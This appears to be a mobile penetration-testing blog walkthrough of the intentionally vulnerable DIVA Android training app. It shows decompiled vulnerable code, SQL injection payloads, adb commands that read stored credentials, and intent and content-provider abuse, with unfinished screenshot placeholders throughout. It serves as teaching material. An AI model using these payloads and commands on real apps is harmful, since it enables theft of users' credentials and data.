---
title: "DIVA (Damn Insecure and Vulnerable App) — Complete Walkthrough"
date: 2026-09-22 09:30:00 +0000
categories: [Mobile Penetration Testing]
tags: [DIVA, Android, MobSF, jadx, Content Provider, SQL Injection, Native]
description: "All 13 DIVA challenges with source-level detail: insecure logging, hardcoded secrets (Java and native), insecure storage, SQL injection, WebView issues, exported components and a native buffer overflow."
author: Paschal Sangawe
toc: true
---

**DIVA (Damn Insecure and Vulnerable App)** by Payatu is the classic first Android target. It has **13 challenges** that map neatly to the OWASP Mobile Top 10: insecure logging, hardcoding, insecure storage, input validation, access control, and native bugs.

Because the source is small and public, DIVA is ideal for learning to read vulnerable code with jadx. This walkthrough gives the vulnerable code and the exact reproduction for each challenge.

> **Authorisation:** DIVA is intentionally insecure and built for training. Everything below was run against my own local instance.

{% raw %}

## Setup

```bash
adb install diva-beta.apk
# package: jakhar.aseem.diva
```

Decompile with jadx to follow along:

```bash
jadx -d diva-out diva-beta.apk
```

## Challenge 1 — Insecure Logging

`LogActivity` writes the credit card number straight into logcat:
> **Picture goes here (#1).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `catch (RuntimeException re) {`.
> _Save as_ `images/diva-walkthrough/1.png` _then replace this block with_ `![Challenge 1 — Insecure Logging](/images/diva-walkthrough/1.png)`_._


```java
catch (RuntimeException re) {
    Log.e("diva-log", "Error while processing transaction with credit card: " + cctxt.getText().toString());
}
```

> **Picture goes here (#2).** Capture this step in the decompiler/editor or terminal. Key line: `catch (RuntimeException re) {`.
> _Save as_ `images/diva-walkthrough/2.png` _then replace this block with_ `![Challenge 1 — Insecure Logging](/images/diva-walkthrough/2.png)`_._


Enter any number and read it back:

```bash
adb logcat | grep diva-log
```

> **Picture goes here (#3).** Capture this request/response or command step in Burp/terminal. Key line: `adb logcat | grep diva-log`.
> _Save as_ `images/diva-walkthrough/3.png` _then replace this block with_ `![Challenge 1 — Insecure Logging](/images/diva-walkthrough/3.png)`_._


> **Picture goes here (#4).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/4.png` _then replace this block with_ `![Challenge 1 — Insecure Logging](/images/diva-walkthrough/4.png)`_._

## Challenge 2 — Hardcoding Issues (Part 1)

The vendor key is hardcoded in `HardcodeActivity`:
> **Picture goes here (#5).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `if (hckey.getText().toString().equals("vendorsecretkey")) {`.
> _Save as_ `images/diva-walkthrough/5.png` _then replace this block with_ `![Challenge 2 — Hardcoding Issues (Part 1)](/images/diva-walkthrough/5.png)`_._


```java
if (hckey.getText().toString().equals("vendorsecretkey")) {
```

> **Picture goes here (#6).** Capture this step in the decompiler/editor or terminal. Key line: `if (hckey.getText().toString().equals("vendorsecretkey")) {`.
> _Save as_ `images/diva-walkthrough/6.png` _then replace this block with_ `![Challenge 2 — Hardcoding Issues (Part 1)](/images/diva-walkthrough/6.png)`_._


Enter `vendorsecretkey`.

> **Picture goes here (#7).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/7.png` _then replace this block with_ `![Challenge 2 — Hardcoding Issues (Part 1)](/images/diva-walkthrough/7.png)`_._

## Challenge 3 — Insecure Data Storage (Part 1)

Credentials are written to `SharedPreferences` in plaintext:
> **Picture goes here (#8).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `SharedPreferences spref = PreferenceManager.getDefaultSharedPreferences(this);`.
> _Save as_ `images/diva-walkthrough/8.png` _then replace this block with_ `![Challenge 3 — Insecure Data Storage (Part 1)](/images/diva-walkthrough/8.png)`_._


```java
SharedPreferences spref = PreferenceManager.getDefaultSharedPreferences(this);
spedit.putString("user", usr.getText().toString());
spedit.putString("password", pwd.getText().toString());
```

> **Picture goes here (#9).** Capture this step in the decompiler/editor or terminal. Key line: `SharedPreferences spref = PreferenceManager.getDefaultSharedPreferences(this);`.
> _Save as_ `images/diva-walkthrough/9.png` _then replace this block with_ `![Challenge 3 — Insecure Data Storage (Part 1)](/images/diva-walkthrough/9.png)`_._


Read them (rooted device or `run-as`):

```bash
adb shell "run-as jakhar.aseem.diva cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml"
```

> **Picture goes here (#10).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell "run-as jakhar.aseem.diva cat /data/data/jakhar.aseem.diva/shared_prefs/jakhar.a`.
> _Save as_ `images/diva-walkthrough/10.png` _then replace this block with_ `![Challenge 3 — Insecure Data Storage (Part 1)](/images/diva-walkthrough/10.png)`_._


> **Picture goes here (#11).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/11.png` _then replace this block with_ `![Challenge 3 — Insecure Data Storage (Part 1)](/images/diva-walkthrough/11.png)`_._

## Challenge 4 — Insecure Data Storage (Part 2)

Credentials go into a SQLite database `ids2`, table `myuser`, and the insert is also injectable:
> **Picture goes here (#12).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `mDB.execSQL("INSERT INTO myuser VALUES ('"+ usr.getText() +"', '"+ pwd.getText() +"');");`.
> _Save as_ `images/diva-walkthrough/12.png` _then replace this block with_ `![Challenge 4 — Insecure Data Storage (Part 2)](/images/diva-walkthrough/12.png)`_._


```java
mDB.execSQL("INSERT INTO myuser VALUES ('"+ usr.getText() +"', '"+ pwd.getText() +"');");
```

> **Picture goes here (#13).** Capture this step in the decompiler/editor or terminal. Key line: `mDB.execSQL("INSERT INTO myuser VALUES ('"+ usr.getText() +"', '"+ pwd.getText() +"');");`.
> _Save as_ `images/diva-walkthrough/13.png` _then replace this block with_ `![Challenge 4 — Insecure Data Storage (Part 2)](/images/diva-walkthrough/13.png)`_._


```bash
adb shell "run-as jakhar.aseem.diva sqlite3 /data/data/jakhar.aseem.diva/databases/ids2 .dump"
```

> **Picture goes here (#14).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell "run-as jakhar.aseem.diva sqlite3 /data/data/jakhar.aseem.diva/databases/ids2 .d`.
> _Save as_ `images/diva-walkthrough/14.png` _then replace this block with_ `![Challenge 4 — Insecure Data Storage (Part 2)](/images/diva-walkthrough/14.png)`_._


> **Picture goes here (#15).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/15.png` _then replace this block with_ `![Challenge 4 — Insecure Data Storage (Part 2)](/images/diva-walkthrough/15.png)`_._

## Challenge 5 — Insecure Data Storage (Part 3)

A temporary file is created in the app's `dataDir` with world read/write:
> **Picture goes here (#16).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `File uinfo = File.createTempFile("uinfo", "tmp", ddir);`.
> _Save as_ `images/diva-walkthrough/16.png` _then replace this block with_ `![Challenge 5 — Insecure Data Storage (Part 3)](/images/diva-walkthrough/16.png)`_._


```java
File uinfo = File.createTempFile("uinfo", "tmp", ddir);
uinfo.setReadable(true);
uinfo.setWritable(true);
fw.write(usr.getText() + ":" + pwd.getText() + "\n");
```

> **Picture goes here (#17).** Capture this step in the decompiler/editor or terminal. Key line: `File uinfo = File.createTempFile("uinfo", "tmp", ddir);`.
> _Save as_ `images/diva-walkthrough/17.png` _then replace this block with_ `![Challenge 5 — Insecure Data Storage (Part 3)](/images/diva-walkthrough/17.png)`_._


```bash
adb shell "run-as jakhar.aseem.diva ls -l /data/data/jakhar.aseem.diva/"
adb shell "run-as jakhar.aseem.diva cat /data/data/jakhar.aseem.diva/uinfo*tmp"
```

> **Picture goes here (#18).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell "run-as jakhar.aseem.diva ls -l /data/data/jakhar.aseem.diva/"`.
> _Save as_ `images/diva-walkthrough/18.png` _then replace this block with_ `![Challenge 5 — Insecure Data Storage (Part 3)](/images/diva-walkthrough/18.png)`_._


> **Picture goes here (#19).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/19.png` _then replace this block with_ `![Challenge 5 — Insecure Data Storage (Part 3)](/images/diva-walkthrough/19.png)`_._

## Challenge 6 — Insecure Data Storage (Part 4)

This one writes to **external storage** at `/.uinfo.txt`:
> **Picture goes here (#20).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `File sdir = Environment.getExternalStorageDirectory();`.
> _Save as_ `images/diva-walkthrough/20.png` _then replace this block with_ `![Challenge 6 — Insecure Data Storage (Part 4)](/images/diva-walkthrough/20.png)`_._


```java
File sdir = Environment.getExternalStorageDirectory();
File uinfo = new File(sdir.getAbsolutePath() + "/.uinfo.txt");
```

> **Picture goes here (#21).** Capture this step in the decompiler/editor or terminal. Key line: `File sdir = Environment.getExternalStorageDirectory();`.
> _Save as_ `images/diva-walkthrough/21.png` _then replace this block with_ `![Challenge 6 — Insecure Data Storage (Part 4)](/images/diva-walkthrough/21.png)`_._


```bash
adb shell cat /sdcard/.uinfo.txt
```

> **Picture goes here (#22).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell cat /sdcard/.uinfo.txt`.
> _Save as_ `images/diva-walkthrough/22.png` _then replace this block with_ `![Challenge 6 — Insecure Data Storage (Part 4)](/images/diva-walkthrough/22.png)`_._


> **Picture goes here (#23).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/23.png` _then replace this block with_ `![Challenge 6 — Insecure Data Storage (Part 4)](/images/diva-walkthrough/23.png)`_._

## Challenge 7 — Input Validation Issues (Part 1) — SQL Injection

`SQLInjectionActivity` builds a raw query by concatenation:
> **Picture goes here (#24).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `SQLInjectionActivity`.
> _Save as_ `images/diva-walkthrough/24.png` _then replace this block with_ `![Challenge 7 — Input Validation Issues (Part 1) — SQL Injection](/images/diva-walkthrough/24.png)`_._


```java
cr = mDB.rawQuery("SELECT * FROM sqliuser WHERE user = '" + srchtxt.getText().toString() + "'", null);
```

> **Picture goes here (#25).** Capture this step in the decompiler/editor or terminal. Key line: `cr = mDB.rawQuery("SELECT * FROM sqliuser WHERE user = '" + srchtxt.getText().toString() +`.
> _Save as_ `images/diva-walkthrough/25.png` _then replace this block with_ `![Challenge 7 — Input Validation Issues (Part 1) — SQL Injection](/images/diva-walkthrough/25.png)`_._


The table seeds `admin/passwd123`, `diva/p@ssword`, `john/password123`. Dump everything with:

```text
' OR '1'='1
```

> **Picture goes here (#26).** Capture this request/response or command step in Burp/terminal. Key line: `' OR '1'='1`.
> _Save as_ `images/diva-walkthrough/26.png` _then replace this block with_ `![Challenge 7 — Input Validation Issues (Part 1) — SQL Injection](/images/diva-walkthrough/26.png)`_._


or

```text
' UNION SELECT user, password, credit_card FROM sqliuser -- 
```

> **Picture goes here (#27).** Capture this request/response or command step in Burp/terminal. Key line: `' UNION SELECT user, password, credit_card FROM sqliuser --`.
> _Save as_ `images/diva-walkthrough/27.png` _then replace this block with_ `![Challenge 7 — Input Validation Issues (Part 1) — SQL Injection](/images/diva-walkthrough/27.png)`_._


> **Picture goes here (#28).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/28.png` _then replace this block with_ `![Challenge 7 — Input Validation Issues (Part 1) — SQL Injection](/images/diva-walkthrough/28.png)`_._

## Challenge 8 — Input Validation Issues (Part 2) — WebView

`InputValidation2URISchemeActivity` loads any URL into a WebView with JavaScript enabled:
> **Picture goes here (#29).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `WebSettings wset = wview.getSettings();`.
> _Save as_ `images/diva-walkthrough/29.png` _then replace this block with_ `![Challenge 8 — Input Validation Issues (Part 2) — WebView](/images/diva-walkthrough/29.png)`_._


```java
WebSettings wset = wview.getSettings();
wset.setJavaScriptEnabled(true);
...
wview.loadUrl(uriText.getText().toString());
```

> **Picture goes here (#30).** Capture this step in the decompiler/editor or terminal. Key line: `WebSettings wset = wview.getSettings();`.
> _Save as_ `images/diva-walkthrough/30.png` _then replace this block with_ `![Challenge 8 — Input Validation Issues (Part 2) — WebView](/images/diva-walkthrough/30.png)`_._


Access local data or fire XSS:

```text
file:///data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml
```

> **Picture goes here (#31).** Capture this request/response or command step in Burp/terminal. Key line: `file:///data/data/jakhar.aseem.diva/shared_prefs/jakhar.aseem.diva_preferences.xml`.
> _Save as_ `images/diva-walkthrough/31.png` _then replace this block with_ `![Challenge 8 — Input Validation Issues (Part 2) — WebView](/images/diva-walkthrough/31.png)`_._


> **Picture goes here (#32).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/32.png` _then replace this block with_ `![Challenge 8 — Input Validation Issues (Part 2) — WebView](/images/diva-walkthrough/32.png)`_._

## Challenge 9 — Access Control Issues (Part 1)

`APICredsActivity` is exported through an implicit intent-filter:
> **Picture goes here (#33).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `<activity android:name=".APICredsActivity">`.
> _Save as_ `images/diva-walkthrough/33.png` _then replace this block with_ `![Challenge 9 — Access Control Issues (Part 1)](/images/diva-walkthrough/33.png)`_._


```xml
<activity android:name=".APICredsActivity">
    <intent-filter>
        <action android:name="jakhar.aseem.diva.action.VIEW_CREDS" />
        <category android:name="android.intent.category.DEFAULT" />
    </intent-filter>
</activity>
```

> **Picture goes here (#34).** Capture this request/response or command step in Burp/terminal. Key line: `<activity android:name=".APICredsActivity">`.
> _Save as_ `images/diva-walkthrough/34.png` _then replace this block with_ `![Challenge 9 — Access Control Issues (Part 1)](/images/diva-walkthrough/34.png)`_._


Start it from outside the app:

```bash
adb shell am start -n jakhar.aseem.diva/.APICredsActivity
```

> **Picture goes here (#35).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell am start -n jakhar.aseem.diva/.APICredsActivity`.
> _Save as_ `images/diva-walkthrough/35.png` _then replace this block with_ `![Challenge 9 — Access Control Issues (Part 1)](/images/diva-walkthrough/35.png)`_._


It displays:

```text
API Key: 123secretapikey123
API User name: diva
API Password: p@ssword
```

> **Picture goes here (#36).** Capture this request/response or command step in Burp/terminal. Key line: `API Key: 123secretapikey123`.
> _Save as_ `images/diva-walkthrough/36.png` _then replace this block with_ `![Challenge 9 — Access Control Issues (Part 1)](/images/diva-walkthrough/36.png)`_._


> **Picture goes here (#37).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/37.png` _then replace this block with_ `![Challenge 9 — Access Control Issues (Part 1)](/images/diva-walkthrough/37.png)`_._

## Challenge 10 — Access Control Issues (Part 2)

`APICreds2Activity` reads a boolean extra `check_pin` (string `chk_pin`) and returns the TVEETER credentials when it is **false**:
> **Picture goes here (#38).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);`.
> _Save as_ `images/diva-walkthrough/38.png` _then replace this block with_ `![Challenge 10 — Access Control Issues (Part 2)](/images/diva-walkthrough/38.png)`_._


```java
boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);
if (bcheck == false) {
    String apidetails = "TVEETER API Key: secrettveeterapikey\nAPI User name: diva2\nAPI Password: p@ssword2";
```

> **Picture goes here (#39).** Capture this step in the decompiler/editor or terminal. Key line: `boolean bcheck = i.getBooleanExtra(getString(R.string.chk_pin), true);`.
> _Save as_ `images/diva-walkthrough/39.png` _then replace this block with_ `![Challenge 10 — Access Control Issues (Part 2)](/images/diva-walkthrough/39.png)`_._


Trigger it directly:

```bash
adb shell am start -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false
```

> **Picture goes here (#40).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell am start -n jakhar.aseem.diva/.APICreds2Activity --ez check_pin false`.
> _Save as_ `images/diva-walkthrough/40.png` _then replace this block with_ `![Challenge 10 — Access Control Issues (Part 2)](/images/diva-walkthrough/40.png)`_._


> **Picture goes here (#41).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/41.png` _then replace this block with_ `![Challenge 10 — Access Control Issues (Part 2)](/images/diva-walkthrough/41.png)`_._

## Challenge 11 — Access Control Issues (Part 3) — Content Provider

`NotesProvider` is exported and unauthenticated:
> **Picture goes here (#42).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `<provider`.
> _Save as_ `images/diva-walkthrough/42.png` _then replace this block with_ `![Challenge 11 — Access Control Issues (Part 3) — Content Provider](/images/diva-walkthrough/42.png)`_._


```xml
<provider
    android:name=".NotesProvider"
    android:authorities="jakhar.aseem.diva.provider.notesprovider"
    android:exported="true" >
</provider>
```

> **Picture goes here (#43).** Capture this request/response or command step in Burp/terminal. Key line: `<provider`.
> _Save as_ `images/diva-walkthrough/43.png` _then replace this block with_ `![Challenge 11 — Access Control Issues (Part 3) — Content Provider](/images/diva-walkthrough/43.png)`_._


Query the private notes from outside the app (no PIN needed):

```bash
adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes
```

> **Picture goes here (#44).** Capture this request/response or command step in Burp/terminal. Key line: `adb shell content query --uri content://jakhar.aseem.diva.provider.notesprovider/notes`.
> _Save as_ `images/diva-walkthrough/44.png` _then replace this block with_ `![Challenge 11 — Access Control Issues (Part 3) — Content Provider](/images/diva-walkthrough/44.png)`_._


> **Picture goes here (#45).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/45.png` _then replace this block with_ `![Challenge 11 — Access Control Issues (Part 3) — Content Provider](/images/diva-walkthrough/45.png)`_._

## Challenge 12 — Hardcoding Issues (Part 2) — Native

`Hardcode2Activity` delegates to the native library `libdivajni.so`, where the key is hardcoded:
> **Picture goes here (#46).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `#define VENDORKEY   "olsdfgad;lh"`.
> _Save as_ `images/diva-walkthrough/46.png` _then replace this block with_ `![Challenge 12 — Hardcoding Issues (Part 2) — Native](/images/diva-walkthrough/46.png)`_._


```c
#define VENDORKEY   "olsdfgad;lh"
...
return ((strncmp(VENDORKEY, key, strlen(VENDORKEY)))?0:1);
```

> **Picture goes here (#47).** Capture this step in the decompiler/editor or terminal. Key line: `...`.
> _Save as_ `images/diva-walkthrough/47.png` _then replace this block with_ `![Challenge 12 — Hardcoding Issues (Part 2) — Native](/images/diva-walkthrough/47.png)`_._


Extract it statically:

```bash
unzip -o diva-beta.apk 'lib/*' -d libs
strings libs/lib/arm64-v8a/libdivajni.so | grep -i ol
```

> **Picture goes here (#48).** Capture this request/response or command step in Burp/terminal. Key line: `unzip -o diva-beta.apk 'lib/*' -d libs`.
> _Save as_ `images/diva-walkthrough/48.png` _then replace this block with_ `![Challenge 12 — Hardcoding Issues (Part 2) — Native](/images/diva-walkthrough/48.png)`_._


Enter `olsdfgad;lh`.

> **Picture goes here (#49).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/49.png` _then replace this block with_ `![Challenge 12 — Hardcoding Issues (Part 2) — Native](/images/diva-walkthrough/49.png)`_._

## Challenge 13 — Input Validation Issues (Part 3) — Buffer Overflow

The missile-launch function copies user input into a fixed 20-byte buffer with `strcpy`:
> **Picture goes here (#50).** Capture a Burp/adb/Frida screenshot for this exercise showing the payload or command you run. Key payload/command: `#define CODESIZEMAX 20`.
> _Save as_ `images/diva-walkthrough/50.png` _then replace this block with_ `![Challenge 13 — Input Validation Issues (Part 3) — Buffer Overflow](/images/diva-walkthrough/50.png)`_._


```c
#define CODESIZEMAX 20
...
char code[CODESIZEMAX];
strcpy(code, pcode);
if (code[0] == '!') { code[0] = '.'; }
ret = strncmp(CODE, code, sizeof(CODE) - 1);   // CODE = ".dotdot"
```

> **Picture goes here (#51).** Capture this step in the decompiler/editor or terminal. Key line: `...`.
> _Save as_ `images/diva-walkthrough/51.png` _then replace this block with_ `![Challenge 13 — Input Validation Issues (Part 3) — Buffer Overflow](/images/diva-walkthrough/51.png)`_._


The correct code is `.dotdot` (or `!dotdot`, since `!` is rewritten to `.`), but supplying a long string overflows the stack and crashes the app — the intended DoS/memory-corruption finding.

> **Picture goes here (#52).** Capture the result that proves this exercise (app screen, logcat, file contents or Frida output).
> _Save as_ `images/diva-walkthrough/52.png` _then replace this block with_ `![Challenge 13 — Input Validation Issues (Part 3) — Buffer Overflow](/images/diva-walkthrough/52.png)`_._

## Lessons

- **Logging:** never log secrets, credentials or financial data.
- **Hardcoding:** secrets in Java/Kotlin or native libraries are recoverable — use the keystore/backend.
- **Storage:** shared prefs, SQLite, temp files and external storage are all readable; encrypt and scope data.
- **Input validation:** parameterise SQL; never load untrusted URLs into a JS-enabled WebView.
- **Access control:** export only what is required and gate it with permissions; validate `getIntent()` extras.
- **Native code:** bound-check copies; `strcpy` into fixed buffers is a classic overflow.

## Related posts

- [InjuredAndroid walkthrough](/posts/injuredandroid-walkthrough/)
- [AndroGoat walkthrough](/posts/androgoat-walkthrough/)
- [Insecure Data Storage](/posts/insecure-storage/)
- [Weak Cryptography](/posts/weak-cryptography/)

{% endraw %}
